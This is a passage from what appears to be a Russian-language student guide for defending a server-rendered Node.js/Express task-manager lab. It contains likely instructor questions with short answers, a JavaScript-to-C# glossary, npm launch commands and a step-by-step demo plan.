| **Полная перезагрузка страницы** | таково требование SSR-задания | прогрессивное улучшение: `fetch` + частичная замена DOM (лаб. №2 обычно об этом) |

## 14. Вероятные вопросы преподавателя и краткие ответы

**Что такое серверный рендеринг и чем отличается от клиентского?**
При SSR HTML формируется на сервере и приходит готовым; при CSR сервер отдаёт пустую оболочку и JSON, а разметку строит JS в браузере. Плюсы SSR — работа без JS, быстрый первый показ, SEO, вся логика на сервере. Минус — перезагрузка страницы на каждое действие.

**Что такое Node.js? Это язык?**
Нет, это среда выполнения JavaScript вне браузера: движок V8 + библиотека libuv + стандартные модули.

**Почему Node однопоточный и при этом выдерживает нагрузку?**
Потому что ввод-вывод неблокирующий: поток не ждёт диск и сеть, а регистрирует колбэк и идёт обрабатывать следующее событие. Этим управляет event loop.

**Что такое middleware?**
Функция `(req, res, next)` в конвейере обработки запроса. Может изменить запрос, завершить его ответом или передать дальше через `next()`. Порядок регистрации = порядок выполнения. Обработчик ошибок отличается четвёртым параметром `err`.

**Как данные из формы попадают в `req.body`?**
Их разбирает middleware: `express.urlencoded()` — для обычных форм, multer — для `multipart/form-data`. Сам по себе Express тело не парсит.

**Зачем `enctype="multipart/form-data"`?**
Без него браузер отправит только имя файла, а содержимое — нет. Этот тип позволяет передать бинарные данные, разделив тело на части разделителем boundary.

**Почему после POST вы делаете редирект?**
Паттерн POST/Redirect/GET: чтобы обновление страницы (F5) не отправило форму повторно и не создало дубликат. Заодно корректно работает кнопка «Назад».

**Чем `<%= %>` отличается от `<%- %>`?**
Первый экранирует HTML (защита от XSS), второй вставляет сырую разметку. Все пользовательские данные выводятся первым.

**Как реализована фильтрация?**
GET-запрос с параметрами `status`, `q`, `sort`; сервер фильтрует массив задач и рендерит уже готовый отфильтрованный список. Параметры остаются в URL, поэтому выборкой можно поделиться ссылкой и она переживает перезагрузку.

**Где хранятся файлы и как обеспечена безопасность?**
Физически — в `uploads/` под именем-UUID; оригинальное имя хранится в JSON. Пользовательское имя на файловую систему не попадает (защита от path traversal), стоят лимиты на размер и количество, папка не раздаётся статикой — только через маршрут с проверкой принадлежности вложения задаче.

**Почему не использовали базу данных?**
Задание её не требует. Слой доступа к данным изолирован в `taskStore.js`, поэтому замена на СУБД затронет один файл.

**Как вы боретесь с одновременными запросами к файлу?**
Все операции чтения/записи выстроены в цепочку промисов (асинхронный мьютекс), а запись атомарна: сначала во временный файл, затем `rename`.

**Что будет, если отключить JavaScript в браузере?**
Всё продолжит работать, кроме диалогов подтверждения удаления, — приложение не зависит от клиентского JS.

## 15. Мини-словарь JS для человека с C#

| JavaScript | C# | Комментарий |
|---|---|---|
| `const` / `let` | `readonly` локальная / `var` | `const` запрещает переприсваивание, но не мутацию объекта |
| `===` | `==` | `===` без приведения типов; `==` в JS лучше не использовать |
| `` `строка ${x}` `` | `$"строка {x}"` | интерполяция |
| `(a, b) => a + b` | `(a, b) => a + b` | лямбда, синтаксис совпадает |
| `const {a, b} = obj` | деконструкция | деструктуризация |
| `...files` | `params` / spread | распаковка массива |
| `a ?? b` | `a ?? b` | null/undefined-коалесценция |
| `obj?.prop` | `obj?.prop` | безопасный доступ |
| `null` и `undefined` | только `null` | `undefined` = «значения нет вообще» |
| `arr.filter/map/sort/find/reduce` | `Where/Select/OrderBy/FirstOrDefault/Aggregate` | LINQ выполняется лениво, JS — сразу |
| `JSON.stringify` / `JSON.parse` | `JsonSerializer.Serialize/Deserialize` | встроено в язык |
| `crypto.randomUUID()` | `Guid.NewGuid()` | |
| `new Date().toISOString()` | `DateTime.UtcNow.ToString("o")` | |
| объект `{}` | `Dictionary<string, object>` / анонимный тип | у объектов нет классов-схем |
| `module.exports` / `require` | сборка + `using` | модуль = файл |

## 16. Демонстрация

```bash
npm install          # установить зависимости (создаст node_modules/)
npm start            # http://localhost:3000
npm run dev          # то же + авторестарт при правке файлов (node --watch)
PORT=4000 npm start  # запуск на другом порту
```

**Что показать комиссии по порядку:**
1. Создать задачу с датой и файлом — показать, что страница перезагрузилась и появилось уведомление.
2. Открыть DevTools → Network → повторить отправку формы: показать `POST` с `multipart/form-data`, ответ **302**, затем автоматический `GET`.
3. Нажать F5 — дубликат не создаётся (PRG работает).
4. Показать вкладки-фильтры: URL меняется на `?status=done`, ссылку можно скопировать.
5. Отправить форму с пустым названием — ошибка валидации, код 400, введённые данные сохранены.
6. Показать `data/tasks.json` и `uploads/` — как выглядят данные и файлы с UUID-именами.
7. **Отключить JavaScript** в браузере и повторить создание задачи — всё работает. Это самый убедительный аргумент «у нас настоящий SSR».
8. Открыть «Просмотр кода страницы» (Ctrl+U) — показать, что список задач присутствует прямо в исходном HTML, а не появляется из JS.
